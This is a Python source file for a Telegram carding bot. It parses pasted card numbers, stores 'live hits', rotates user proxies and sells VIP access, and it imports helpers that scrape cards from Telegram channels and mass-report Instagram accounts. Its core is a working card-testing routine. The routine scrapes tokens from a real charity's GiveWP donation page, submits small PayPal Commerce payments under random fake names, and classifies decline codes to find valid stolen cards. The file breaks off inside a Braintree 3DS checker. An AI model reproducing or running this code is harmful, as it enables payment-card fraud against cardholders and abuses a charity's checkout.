# -*- coding: utf-8 -*-
import os
import json
import shutil
import uuid

if not os.path.exists("data.json"):
    with open("data.json", "w", encoding="utf-8") as f:
        json.dump({}, f)

# ── Run startup migration: encrypt any plaintext SK keys left in data.json ──
try:
    from sk_crypto import migrate_data_json as _migrate_sk_startup
    _n = _migrate_sk_startup()
    if _n:
        print(f"[SK-CRYPTO] Startup migration: {_n} plaintext SK key(s) encrypted.")
except SystemExit:
    raise  # propagate key-not-configured exit
except Exception as _sk_mig_err:
    print(f"[SK-CRYPTO] Migration warning: {_sk_mig_err}")

import telebot
import re
from user_agent import generate_user_agent
import requests
import time
import random
import string
from telebot import types
from gatet import ahmed
from datetime import datetime, timedelta, timezone
from shopify_checker import run_check as _sp_check, extract_clean_response as _sp_clean
import asyncio as _sp_asyncio
from faker import Faker
import threading
from bs4 import BeautifulSoup
import base64
import ui_formatter as UI
import cloudscraper
import urllib3
import urllib.parse
from requests_toolbelt.multipart.encoder import MultipartEncoder
import jwt
from fake_useragent import UserAgent
import logging
from database import Database
from dlx_hitter import dlx_hit_single as _dlx_hit_single
from services.tg_scraper_service import scrape_channel_for_ccs as _tg_scrape_ccs, check_rate_limit as _tg_scr_rate_check
from services.ig_reporter import ig_login, ig_login_from_cookies, get_target_id, run_reports, REASON_MAP as _IG_REASONS
from services.stripe_link_converter import convert_stripe_link as _strp_convert
from utils.tg_scr_validator import is_tg_link, validate_link, validate_quantity
from utils.tg_scr_formatter import (
    fmt_processing as _scr_proc,
    fmt_success as _scr_ok,
    fmt_no_cards as _scr_no_cards,
    fmt_error as _scr_err,
    fmt_usage as _scr_usage,
    fmt_file_caption as _scr_cap,
)
from sk_crypto import encrypt_sk as _enc_sk, decrypt_sk as _dec_sk, migrate_data_json as _migrate_sk

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

stopuser = {}

# ── Merge store: live hits per user ─────────────────────────────────────────
_merge_store = {}   # {uid(int): [cc_str, ...]}
_MERGE_MAX   = 300  # max CCs stored per user

def _add_to_merge(uid, cc):
    """Append a live hit CC to this user's merge list (no duplicates)."""
    uid = int(uid)
    lst = _merge_store.setdefault(uid, [])
    cc  = str(cc).strip()
    if cc and cc not in lst:
        lst.append(cc)
        if len(lst) > _MERGE_MAX:
            _merge_store[uid] = lst[-_MERGE_MAX:]

def _notify_live_hit(chat_id, cc, source="", holder=None):
    """Send/edit a single live-hits message per checker run.
    holder: a list [msg_or_None, [cc, ...]] shared across one checker run.
    """
    if holder is None:
        return
    try:
        tag = f" <i>via {source}</i>" if source else ""
        if holder[0] is None:
            # First hit — send new message
            holder[1].append(cc)
            text = (f"✅ <b>Live Hits{tag}</b>\n\n"
                    + "\n".join(f"<code>{c}</code>" for c in holder[1]))
            msg = bot.send_message(chat_id, text, parse_mode='HTML')
            holder[0] = msg
        else:
            # Subsequent hits — edit existing message
            holder[1].append(cc)
            text = (f"✅ <b>Live Hits{tag}</b>\n\n"
                    + "\n".join(f"<code>{c}</code>" for c in holder[1]))
            bot.edit_message_text(text, chat_id, holder[0].message_id, parse_mode='HTML')
    except Exception:
        pass
# ─────────────────────────────────────────────────────────────────────────────

db = Database()

RATE_LIMIT = {}
RATE_LIMIT_SECONDS = 5
RATE_LIMIT_VIP_SECONDS = 2
_RATE_LIMIT_LOCK = threading.Lock()

def check_rate_limit(user_id, plan='𝗙𝗥𝗘𝗘'):
    now = time.time()
    limit = RATE_LIMIT_VIP_SECONDS if plan != '𝗙𝗥𝗘𝗘' else RATE_LIMIT_SECONDS
    with _RATE_LIMIT_LOCK:
        stale = [uid for uid, ts in RATE_LIMIT.items() if now - ts > 60]
        for uid in stale:
            del RATE_LIMIT[uid]
        last = RATE_LIMIT.get(user_id, 0)
        if now - last < limit:
            return False, round(limit - (now - last), 1)
        RATE_LIMIT[user_id] = now
    return True, 0

_DATA_LOCK = threading.Lock()

def _load_data():
    with _DATA_LOCK:
        try:
            with open("data.json", 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return {}

def _save_data(data):
    with _DATA_LOCK:
        try:
            with open("data.json", 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=4)
            return True
        except Exception as e:
            logger.error(f"data.json save error: {e}")
            return False

def _get_card_from_message(message):
    CARD_RE = re.compile(r'\d{13,19}[\|/ ]\d{1,2}[\|/ ]\d{2,4}[\|/ ]\d{3,4}')
    parts = message.text.split(' ', 1)
    if len(parts) > 1 and parts[1].strip():
        raw = parts[1].strip()
        m = CARD_RE.search(raw)
        if m:
            return m.group().replace('/', '|').replace(' ', '|')
        return raw
    replied = message.reply_to_message
    if replied:
        text = None
        if replied.document and replied.document.file_name and replied.document.file_name.lower().endswith('.txt'):
            try:
                file_info = bot.get_file(replied.document.file_id)
                downloaded = bot.download_file(file_info.file_path)
                text = downloaded.decode('utf-8', errors='ignore')
            except:
                pass
        if not text:
            text = replied.text or replied.caption or ""
        for line in text.strip().split('\n'):
            line = line.strip()
            m = CARD_RE.search(line)
            if m:
                return m.group().replace('/', '|').replace(' ', '|')
    return None

def _get_cards_from_message(message):
    CARD_RE = re.compile(r'\d{13,19}[\|/ ]\d{1,2}[\|/ ]\d{2,4}[\|/ ]\d{3,4}')
    _AMOUNT_ONLY_RE = re.compile(r'^\d+(\.\d+)?$')   # "2", "2.5", "10.00" etc.
    parts = message.text.split(' ', 1)
    _inline_text = parts[1].strip() if len(parts) > 1 and parts[1].strip() else ''
    # If the only thing after the command is a plain number (amount), don't treat it as card text.
    # Fall through to check reply_to_message instead.
    if _inline_text and not _AMOUNT_ONLY_RE.match(_inline_text):
        text = _inline_text
    elif message.reply_to_message and message.reply_to_message.text:
        text = message.reply_to_message.text.strip()
    elif message.reply_to_message and message.reply_to_message.document:
        try:
            doc = message.reply_to_message.document
            file_info = bot.get_file(doc.file_id)
            downloaded = bot.download_file(file_info.file_path)
            text = downloaded.decode('utf-8', errors='ignore')
        except:
            return None
    else:
        return None
    cards = []
    seen = set()
    for l in text.split('\n'):
        m = CARD_RE.search(l.strip())
        if m:
            cc = m.group().replace('/', '|').replace(' ', '|')
            if cc not in seen:
                seen.add(cc)
                cards.append(cc)
    return cards if cards else None


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#   INTERNAL VALIDATOR HELPERS  (no external API)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _luhn_valid(number: str) -> bool:
    """Return True if card number string passes Luhn check."""
    digits = [int(d) for d in number if d.isdigit()]
    if len(digits) < 13:
        return False
    total = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


def _card_network(num: str) -> str:
    """Detect payment network from card number prefix."""
    n = num.strip()
    if n.startswith('4'):
        return 'Visa'
    if n[:2] in ('51','52','53','54','55') or (
            n[:4].isdigit() and 2221 <= int(n[:4]) <= 2720):
        return 'Mastercard'
    if n[:2] in ('34','37'):
        return 'Amex'
    if n[:4] == '6011' or n[:2] == '65' or n[:3] in ('644','645','646','647','648','649'):
        return 'Discover'
    if n[:4].isdigit() and 3528 <= int(n[:4]) <= 3589:
        return 'JCB'
    if n[:4] in ('5018','5020','5038','6304','6759','6761','6762','6763'):
        return 'Maestro'
    if n[:2] in ('36','38') or n[:4] == '3095':
        return 'Diners'
    if n[:2] == '62':
        return 'UnionPay'
    return 'Unknown'


def _card_expiry_status(mm: str, yy: str):
    """Return (display_str, is_expired)."""
    try:
        m = int(mm)
        y = int(yy)
        if y < 100:
            y += 2000
        today = datetime.now()
        expired = y < today.year or (y == today.year and m < today.month)
        return f"{str(m).zfill(2)}/{str(y)[-2:]}", expired
    except Exception:
        return f"{mm}/{yy}", False


def _parse_card(ccx):
    ccx = ccx.strip()
    parts = re.split(r'[\|/ ]', ccx)
    if len(parts) < 4:
        return None
    cc = parts[0].strip()
    mm = parts[1].strip().zfill(2)
    yy = parts[2].strip()
    cvc = parts[3].strip()
    if not cc or not cc.isdigit() or len(cc) < 13:
        return None
    if len(yy) == 4:
        yy = yy[2:]
    yy = yy.zfill(2)
    return cc, mm, yy, cvc

def get_user_plan(user_id):
    """Return (plan_str, expired_bool). Automatically downgrades expired VIP plans."""
    try:
        data = _load_data()
        uid  = str(user_id)
        plan  = data.get(uid, {}).get('plan',  '𝗙𝗥𝗘𝗘')
        timer = data.get(uid, {}).get('timer', 'none')
        if plan in ('𝗩𝗜𝗣', 'VIP') and timer not in ('none', None, ''):
            try:
                exp = datetime.strptime(timer.split('.')[0], "%Y-%m-%d %H:%M")
                if datetime.now() > exp:
                    data[uid]['plan']  = '𝗙𝗥𝗘𝗘'
                    data[uid]['timer'] = 'none'
                    _save_data(data)
                    return '𝗙𝗥𝗘𝗘', True
            except Exception:
                pass
        return plan, False
    except Exception:
        return '𝗙𝗥𝗘𝗘', False

def log_command(message, query_type='command', gateway=None):
    try:
        user = message.from_user
        db.save_user(
            user_id=user.id,
            username=user.username,
            first_name=user.first_name,
            last_name=user.last_name
        )
        query_id = db.save_query(
            user_id=user.id,
            message_id=message.message_id,
            query_text=message.text or '',
            query_type=query_type,
            chat_id=message.chat.id,
            gateway=gateway
        )
        return query_id
    except Exception as e:
        logger.error(f"Error logging command: {e}")
        return None

def log_card_check(user_id, card, gateway, result, response_detail=None, exec_time=None):
    try:
        bin_part = card.split('|')[0][:6] + 'xxxxxx'
        db.save_card_check(
            user_id=user_id,
            card_bin=bin_part,
            gateway=gateway,
            result=result,
            response_detail=response_detail,
            execution_time=exec_time
        )
    except Exception as e:
        logger.error(f"Error logging card check: {e}")

# ── Global thread exception wrapper ──────────────────────────────────────────
def _safe_thread(fn):
    """Wrap a thread target so unhandled exceptions are logged, not silently lost."""
    import functools
    @functools.wraps(fn)
    def wrapper(*args, **kwargs):
        try:
            return fn(*args, **kwargs)
        except Exception as _te:
            logger.error(f"[THREAD ERROR] {fn.__name__}: {_te}", exc_info=True)
    return wrapper

# ── Proxy validation helper ───────────────────────────────────────────────────
def _validate_proxy(proxy_dict, timeout=8):
    """Return True if proxy is reachable, False otherwise."""
    if not proxy_dict:
        return True
    try:
        r = requests.get("https://api.ipify.org?format=json",
                         proxies=proxy_dict, timeout=timeout)
        return r.status_code == 200
    except Exception:
        return False

# ─────────────────────────────────────────────────────────────────────────────
token = os.environ.get('BOT_TOKEN', '').strip()
if not token:
    raise SystemExit("❌ BOT_TOKEN is not set. Please add it to Replit Secrets.")

_admin_raw = os.environ.get('ADMIN_ID', '').strip()
if not _admin_raw or not _admin_raw.lstrip('-').isdigit():
    raise SystemExit("❌ ADMIN_ID is not set or invalid. Please add your Telegram numeric ID to Replit Secrets.")

telebot.apihelper.ENABLE_MIDDLEWARE = True

bot = telebot.TeleBot(token, parse_mode="HTML")
admin = int(_admin_raw)
BOT_START_TIME = time.time()
try:
    _BOT_ME = bot.get_me()
    _BOT_LINK = f"https://t.me/{_BOT_ME.username}"
    _BOT_LABEL = _BOT_ME.first_name or "ST CO ✨"
except Exception:
    _BOT_LINK  = "https://t.me/ST_CO_BOT"
    _BOT_LABEL = "ST CO ✨"

_REACTION_EMOJIS = [
    "🔥", "⚡", "💯", "🤩", "👌", "🎉", "🚀", "😎",
    "💪", "🏆", "✅", "😍", "🥳", "🤑", "😈", "🎯",
    "💥", "🌟", "🤙", "👑", "😂", "🤣", "💀", "🗿",
]

class _AutoReactMiddleware(telebot.BaseMiddleware):
    def __init__(self):
        self.update_types = ['message']
    def pre_process(self, message, data):
        try:
            emoji = random.choice(_REACTION_EMOJIS)
            reaction = [telebot.types.ReactionTypeEmoji(emoji)]
            threading.Thread(
                target=bot.set_message_reaction,
                args=(message.chat.id, message.message_id),
                kwargs={"reaction": reaction, "is_big": False},
                daemon=True
            ).start()
        except Exception:
            pass
    def post_process(self, message, response, exception):
        pass

bot.setup_middleware(_AutoReactMiddleware())

command_usage = {}

# ملف تخزين البروكسي لكل مستخدم
PROXY_FILE   = 'user_proxies.json'
_PROXY_LOCK  = threading.Lock()
# In-memory cache for proxy file (P1 fix: avoids disk read on every card check)
_PROXY_CACHE     = {"data": None, "ts": 0.0}
_PROXY_CACHE_TTL = 5.0   # seconds

def load_user_proxies():
    """Load proxies from disk with a 5-second in-memory cache."""
    with _PROXY_LOCK:
        now = time.time()
        if _PROXY_CACHE["data"] is not None and (now - _PROXY_CACHE["ts"]) < _PROXY_CACHE_TTL:
            return dict(_PROXY_CACHE["data"])  # return a copy
        try:
            with open(PROXY_FILE, 'r') as f:
                data = json.load(f)
        except Exception:
            data = {}
        _PROXY_CACHE["data"] = data
        _PROXY_CACHE["ts"]   = now
        return dict(data)

def save_user_proxies(proxies):
    with _PROXY_LOCK:
        with open(PROXY_FILE, 'w') as f:
            json.dump(proxies, f, indent=4)
        # Invalidate cache on write
        _PROXY_CACHE["data"] = None
        _PROXY_CACHE["ts"]   = 0.0

def _get_user_proxy_list(user_id):
    proxies = load_user_proxies()
    val = proxies.get(str(user_id), None)
    if val is None:
        return []
    if isinstance(val, str):
        return [val]
    if isinstance(val, list):
        return val
    return []

def get_user_proxy(user_id):
    lst = _get_user_proxy_list(user_id)
    if not lst:
        return None
    return random.choice(lst)

def add_user_proxy(user_id, proxy):
    proxies = load_user_proxies()
    uid = str(user_id)
    existing = proxies.get(uid, [])
    if isinstance(existing, str):
        existing = [existing] if existing else []
    if proxy not in existing:
        existing.append(proxy)
    proxies[uid] = existing
    save_user_proxies(proxies)
    return len(existing)

def set_user_proxy(user_id, proxy):
    proxies = load_user_proxies()
    proxies[str(user_id)] = [proxy]
    save_user_proxies(proxies)

def remove_user_proxy(user_id, proxy=None):
    proxies = load_user_proxies()
    uid = str(user_id)
    if uid not in proxies:
        return 0
    if proxy is None:
        del proxies[uid]
        save_user_proxies(proxies)
        return 0
    existing = proxies[uid]
    if isinstance(existing, str):
        existing = [existing]
    existing = [p for p in existing if p != proxy]
    if existing:
        proxies[uid] = existing
    else:
        del proxies[uid]
    save_user_proxies(proxies)
    return len(existing)

def parse_proxy(raw):
    if any(raw.startswith(p) for p in ['http://', 'https://', 'socks4://', 'socks5://']):
        return raw

    is_socks = 'socks' in raw.lower()
    proto = 'socks5' if is_socks else 'http'

    parts = raw.split(':')

    if len(parts) == 4:
        p1, p2, p3, p4 = parts
        if p2.isdigit():
            return f'{proto}://{p3}:{p4}@{p1}:{p2}'
        elif p4.isdigit():
            return f'{proto}://{p1}:{p2}@{p3}:{p4}'
        else:
            return f'{proto}://{p3}:{p4}@{p1}:{p2}'
    elif len(parts) == 2:
        return f'{proto}://{parts[0]}:{parts[1]}'
    elif len(parts) == 5:
        first = parts[0].lower()
        if first in ['http', 'https', 'socks4', 'socks5']:
            return f'{first}://{parts[3]}:{parts[4]}@{parts[1]}:{parts[2]}'
        else:
            return f'{proto}://{raw}'
    else:
        return f'{proto}://{raw}'

def get_proxy_dict(user_id):
    proxy = get_user_proxy(user_id)
    if proxy:
        return {'http': proxy, 'https': proxy}
    return None

def apply_proxy(session_obj, user_id):
    proxy_dict = get_proxy_dict(user_id)
    if proxy_dict:
        session_obj.proxies.update(proxy_dict)
    return session_obj

# ملف تخزين إعدادات المبالغ لكل مستخدم
AMOUNT_FILE = 'user_amounts.json'
_AMOUNT_LOCK     = threading.Lock()
# In-memory cache for amount file (P3 fix: avoids disk read on every card check)
_AMOUNT_CACHE     = {"data": None, "ts": 0.0}
_AMOUNT_CACHE_TTL = 10.0   # seconds

def load_user_amounts():
    """Load amounts from disk with a 10-second in-memory cache."""
    with _AMOUNT_LOCK:
        now = time.time()
        if _AMOUNT_CACHE["data"] is not None and (now - _AMOUNT_CACHE["ts"]) < _AMOUNT_CACHE_TTL:
            return dict(_AMOUNT_CACHE["data"])
        try:
            with open(AMOUNT_FILE, 'r') as f:
                data = json.load(f)
        except Exception:
            data = {}
        _AMOUNT_CACHE["data"] = data
        _AMOUNT_CACHE["ts"]   = now
        return dict(data)

def save_user_amounts(amounts):
    with _AMOUNT_LOCK:
        with open(AMOUNT_FILE, 'w') as f:
            json.dump(amounts, f, indent=4)
        # Invalidate cache on write
        _AMOUNT_CACHE["data"] = None
        _AMOUNT_CACHE["ts"]   = 0.0

def get_user_amount(user_id):
    amounts = load_user_amounts()
    return amounts.get(str(user_id), "1.00")

def set_user_amount(user_id, amount):
    amounts = load_user_amounts()
    amounts[str(user_id)] = amount
    save_user_amounts(amounts)

# ملف تخزين الأكواد المستخدمة
USED_CODES_FILE = 'used_codes.json'

# دوال إدارة الأكواد المستخدمة
def load_used_codes():
    try:
        with open(USED_CODES_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {"used_codes": []}

def save_used_codes(used_codes):
    with open(USED_CODES_FILE, 'w') as f:
        json.dump(used_codes, f, indent=4)

def is_code_used(code):
    used = load_used_codes()
    return code in used.get("used_codes", [])

def mark_code_as_used(code):
    used = load_used_codes()
    if "used_codes" not in used:
        used["used_codes"] = []
    used["used_codes"].append(code)
    save_used_codes(used)

def reset_command_usage():
    for user_id in command_usage:
        command_usage[user_id] = {'count': 0, 'last_time': None}

# ================== PayPal Gateway Function ==================
# ── PayPal Commerce site list (Give plugin) ─────────────────────────────────
_PP_SITES = [
    {
        'url':    'https://www.rarediseasesinternational.org',
        'donate': '/donate/',
    },
]

def _pp_classify(text, response_obj=None):
    """Shared PayPal response classifier — returns bold result string or None."""
    if 'true' in text or 'sucsess' in text or 'success' in text.lower():
        return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱"
    codes = [
        ('DO_NOT_HONOR',                   "𝗗𝗼 𝗻𝗼𝘁 𝗵𝗼𝗻𝗼𝗿"),
        ('PAYER_ACCOUNT_LOCKED_OR_CLOSED',  "𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗰𝗹𝗼𝘀𝗲𝗱"),
        ('ACCOUNT_CLOSED',                  "𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗰𝗹𝗼𝘀𝗲𝗱"),
        ('LOST_OR_STOLEN',                  "𝗟𝗢𝗦𝗧 𝗢𝗥 𝗦𝗧𝗢𝗟𝗘𝗡"),
        ('CVV2_FAILURE',                    "𝗖𝗮𝗿𝗱 𝗜𝘀𝘀𝘂𝗲𝗿 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 𝗖𝗩𝗩"),
        ('SUSPECTED_FRAUD',                 "𝗦𝗨𝗦𝗣𝗘𝗖𝗧𝗘𝗗 𝗙𝗥𝗔𝗨𝗗"),
        ('INVALID_ACCOUNT',                 "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧"),
        ('REATTEMPT_NOT_PERMITTED',         "𝗥𝗘𝗔𝗧𝗧𝗘𝗠𝗣𝗧 𝗡𝗢𝗧 𝗣𝗘𝗥𝗠𝗜𝗧𝗧𝗘𝗗"),
        ('ACCOUNT BLOCKED BY ISSUER',       "𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗕𝗟𝗢𝗖𝗞𝗘𝗗 𝗕𝗬 𝗜𝗦𝗦𝗨𝗘𝗥"),
        ('ORDER_NOT_APPROVED',              "𝗢𝗥𝗗𝗘𝗥 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"),
        ('PICKUP_CARD_SPECIAL_CONDITIONS',  "𝗣𝗜𝗖𝗞𝗨𝗣 𝗖𝗔𝗥𝗗 𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗖𝗢𝗡𝗗𝗜𝗧𝗜𝗢𝗡𝗦"),
        ('PAYER_CANNOT_PAY',                "𝗣𝗔𝗬𝗘𝗥 𝗖𝗔𝗡𝗡𝗢𝗧 𝗣𝗔𝗬"),
        ('INSUFFICIENT_FUNDS',              "𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀"),
        ('GENERIC_DECLINE',                 "𝗚𝗘𝗡𝗘𝗥𝗜𝗖 𝗗𝗘𝗖𝗟𝗜𝗡𝗘"),
        ('COMPLIANCE_VIOLATION',            "𝗖𝗢𝗠𝗣𝗟𝗜𝗔𝗡𝗖𝗘 𝗩𝗜𝗢𝗟𝗔𝗧𝗜𝗢𝗡"),
        ('TRANSACTION_NOT PERMITTED',       "𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗡𝗢𝗧 𝗣𝗘𝗥𝗠𝗜𝗧𝗧𝗘𝗗"),
        ('PAYMENT_DENIED',                  "𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗗𝗘𝗡𝗜𝗘𝗗"),
        ('INVALID_TRANSACTION',             "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡"),
        ('RESTRICTED_OR_INACTIVE_ACCOUNT',  "𝗥𝗘𝗦𝗧𝗥𝗜𝗖𝗧𝗘𝗗 𝗢𝗥 𝗜𝗡𝗔𝗖𝗧𝗜𝗩𝗘 𝗔𝗖𝗖𝗢𝗨𝗡𝗧"),
        ('SECURITY_VIOLATION',              "𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗩𝗜𝗢𝗟𝗔𝗧𝗜𝗢𝗡"),
        ('DECLINED_DUE_TO_UPDATED_ACCOUNT', "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 𝗗𝗨𝗘 𝗧𝗢 𝗨𝗣𝗗𝗔𝗧𝗘𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧"),
        ('INVALID_OR_RESTRICTED_CARD',      "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗖𝗔𝗥𝗗"),
        ('EXPIRED_CARD',                    "𝗘𝗫𝗣𝗜𝗥𝗘𝗗 𝗖𝗔𝗥𝗗"),
        ('CRYPTOGRAPHIC_FAILURE',           "𝗖𝗥𝗬𝗣𝗧𝗢𝗚𝗥𝗔𝗣𝗛𝗜𝗖 𝗙𝗔𝗜𝗟𝗨𝗥𝗘"),
        ('TRANSACTION_CANNOT_BE_COMPLETED', "𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗖𝗔𝗡𝗡𝗢𝗧 𝗕𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗"),
        ('DECLINED_PLEASE_RETRY',           "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 𝗣𝗟𝗘𝗔𝗦𝗘 𝗥𝗘𝗧𝗥𝗬 𝗟𝗔𝗧𝗘𝗥"),
        ('TX_ATTEMPTS_EXCEED_LIMIT',        "𝗘𝗫𝗖𝗘𝗘𝗗 𝗟𝗜𝗠𝗜𝗧"),
    ]
    for code, label in codes:
        if code in text:
            return label
    if 'NOT FOUND' in text or 'not found' in text.lower():
        return "𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀"
    if response_obj is not None:
        try:
            err = response_obj.json()['data']['error']
            return f"𝗘𝗿𝗿𝗼𝗿: {err}"
        except Exception:
            pass
    return None


def _pp_try_site(site_cfg, n, mm, yy, cvc, amount, first_name, last_name, email, proxy_dict=None):
    """Run Give+PayPal Commerce flow on one site. Returns result string, or None if site error."""
    site_url    = site_cfg['url']
    full_donate = site_url + site_cfg['donate']
    ajax_url    = site_url + '/wp-admin/admin-ajax.php'
    ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

    sess = requests.Session()
    sess.verify = False
    if proxy_dict:
        sess.proxies.update(proxy_dict)

    try:
        resp     = sess.get(full_donate, headers={'user-agent': ua}, timeout=20)
        id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', resp.text).group(1)
        id_form2 = re.search(r'name="give-form-id" value="(.*?)"', resp.text).group(1)
        nonec    = re.search(r'name="give-form-hash" value="(.*?)"', resp.text).group(1)
        enc      = re.search(r'"data-client-token":"(.*?)"', resp.text).group(1)
        au       = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc).decode('utf-8')).group(1)
    except Exception:
        return None

    base_hdrs = {
        'origin': site_url, 'referer': full_donate,
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin', 'user-agent': ua,
        'x-requested-with': 'XMLHttpRequest',
    }

    sess.post(ajax_url, headers=base_hdrs, data={
        'give-honeypot': '', 'give-form-id-prefix': id_form1,
        'give-form-id': id_form2, 'give-form-title': '',
        'give-current-url': full_donate, 'give-form-url': full_donate,
        'give-form-minimum': amount, 'give-form-maximum': '999999.99',
        'give-form-hash': nonec, 'give-price-id': 'custom',
        'give-amount': amount, 'give_stripe_payment_method': '',
        'payment-mode': 'paypal-commerce',
        'give_first': first_name, 'give_last': last_name,
        'give_email': email, 'card_name': f"{first_name} {last_name}",
        'card_exp_month': '', 'card_exp_year': '',
        'give_action': 'purchase', 'give-gateway': 'paypal-commerce',
        'action': 'give_process_donation', 'give_ajax': 'true',
    }, timeout=20)

    mp1 = MultipartEncoder({
        'give-honeypot': (None, ''), 'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2), 'give-form-title': (None, ''),
        'give-current-url': (None, full_donate), 'give-form-url': (None, full_donate),
        'give-form-minimum': (None, amount), 'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, nonec), 'give-price-id': (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, amount), 'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, first_name), 'give_last': (None, last_name),
        'give_email': (None, email), 'card_name': (None, f"{first_name} {last_name}"),
        'card_exp_month': (None, ''), 'card_exp_year': (None, ''),
        'give-gateway': (None, 'paypal-commerce'),
    })
    h1 = {**base_hdrs, 'content-type': mp1.content_type}
    del h1['x-requested-with']
    r_order = sess.post(ajax_url, params={'action': 'give_paypal_commerce_create_order'},
                        headers=h1, data=mp1, timeout=20)
    try:
        tok = r_order.json()['data']['id']
    except Exception:
        return None

    sess.post(
        f'https://api-m.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
        headers={
            'Authorization': f'Bearer {au}',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'PayPal-Request-Id': f'pp-{tok}',
            'user-agent': ua,
        },
        json={
            'payment_source': {
                'card': {
                    'number': n, 'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
        },
        timeout=20,
        verify=False,
    )

    mp2 = MultipartEncoder({
        'give-honeypot': (None, ''), 'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2), 'give-form-title': (None, ''),
        'give-current-url': (None, full_donate), 'give-form-url': (None, full_donate),
        'give-form-minimum': (None, amount), 'give-form-maximum': (None, '999999.99'),
        'give-form-hash': (None, nonec), 'give-price-id': (None, 'custom'),
        'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
        '_give_is_donation_recurring': (None, '0'),
        'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
        'give-amount': (None, amount), 'give_stripe_payment_method': (None, ''),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, first_name), 'give_last': (None, last_name),
        'give_email': (None, email), 'card_name': (None, f"{first_name} {last_name}"),
        'card_exp_month': (None, ''), 'card_exp_year': (None, ''),
        'give-gateway': (None, 'paypal-commerce'),
    })
    h2 = {**base_hdrs, 'content-type': mp2.content_type}
    del h2['x-requested-with']
    final = sess.post(ajax_url,
                      params={'action': 'give_paypal_commerce_approve_order', 'order': tok},
                      headers=h2, data=mp2, timeout=20)

    classified = _pp_classify(final.text, final)
    if classified:
        return classified
    snippet = final.text.strip()[:80].replace('\n', ' ') if final.text else 'empty'
    return f"𝗘𝗥𝗥: {snippet}"


def paypal_gate(ccx, amount="1.00", proxy_dict=None):
    parsed = _parse_card(ccx)
    if not parsed:
        return "𝗘𝗿𝗿𝗼𝗿: Invalid card format (need cc|mm|yy|cvv)"
    n, mm, yy, cvc = parsed

    try:
        amount = f"{max(0.01, min(5.0, float(amount))):.2f}"
    except Exception:
        amount = "1.00"

    _fnames = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles"]
    _lnames = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
    first_name = random.choice(_fnames)
    last_name  = random.choice(_lnames)
    email      = f"{first_name.lower()}{last_name.lower()}{random.randint(100,999)}@gmail.com"

    for site_cfg in _PP_SITES:
        result = _pp_try_site(site_cfg, n, mm, yy, cvc, amount,
                              first_name, last_name, email, proxy_dict)
        if result is not None:
            return result

    return "𝗨𝗡𝗞𝗡𝗢𝗪𝗡 𝗘𝗥𝗥𝗢𝗥"


# ================== Passed Gateway Function (Braintree 3DS) ==================
def passed_gate(ccx, proxy_dict=None):
    import string, bs4, random, requests, uuid, base64, jwt, re
    from user_agent import generate_user_agent
    
    parsed = _parse_card(ccx)
    if not parsed:
